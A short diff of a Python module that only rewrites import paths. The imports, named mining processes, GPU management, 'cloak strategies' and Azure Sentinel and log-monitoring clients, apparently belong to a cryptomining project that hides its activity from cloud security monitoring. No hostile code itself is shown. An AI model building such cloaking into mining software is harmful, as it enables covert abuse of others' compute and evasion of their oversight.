@@ -16,12 +16,12 @@ from readerwriterlock import rwlock
 from itertools import count
 
 # Import các module phụ trợ từ dự án
-from .base_manager import BaseManager
-from .utils import MiningProcess, GPUManager
-from .cloak_strategies import CloakStrategy, CloakStrategyFactory
+from ..app.mining_environment.scripts.base_manager import BaseManager
+from ..app.mining_environment.scripts.utils import MiningProcess, GPUManager
+from ..app.mining_environment.scripts.cloak_strategies import CloakStrategy, CloakStrategyFactory
 
 # CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
-from .azure_clients import (
+from ..app.mining_environment.scripts.azure_clients import (
     AzureSentinelClient,
     AzureLogAnalyticsClient,
     AzureNetworkWatcherClient,
@@ -30,8 +30,8 @@ from .azure_clients import (
     AzureOpenAIClient
 )
 
-from .auxiliary_modules import temperature_monitor
-from .auxiliary_modules.power_management import (
+from ..app.mining_environment.scripts.auxiliary_modules import temperature_monitor
+from ..app.mining_environment.scripts.auxiliary_modules.power_management import (
     PowerManager,
     get_cpu_power,
     get_gpu_power,
